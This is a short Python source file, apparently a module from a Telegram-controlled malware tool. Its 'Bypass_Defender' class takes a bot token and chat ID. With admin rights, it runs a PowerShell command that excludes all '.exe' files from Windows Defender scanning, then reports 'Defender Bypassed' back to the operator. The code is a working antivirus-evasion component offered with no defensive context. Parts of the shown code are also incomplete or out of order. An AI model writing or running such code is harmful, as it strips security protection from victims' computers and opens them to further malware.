import os, ctypes, requests , getpass, sys
class Bypass_Defender():
	def __init__(self,_):
		self._ = _
		self.Main()

		self.token = sys.argv[1]
		self.chat_id = sys.argv[2]

		if ctypes.windll.shell32.IsUserAnAdmin() == 1:
			os.system("powershell.exe -c \"Add-MpPreference -ExclusionExtension '.exe';\"")
			self._.Send_Message("✔ Defender Bypassed.")
		else:
			self._.Send_Message("✖️ Need Admin Permissions.")

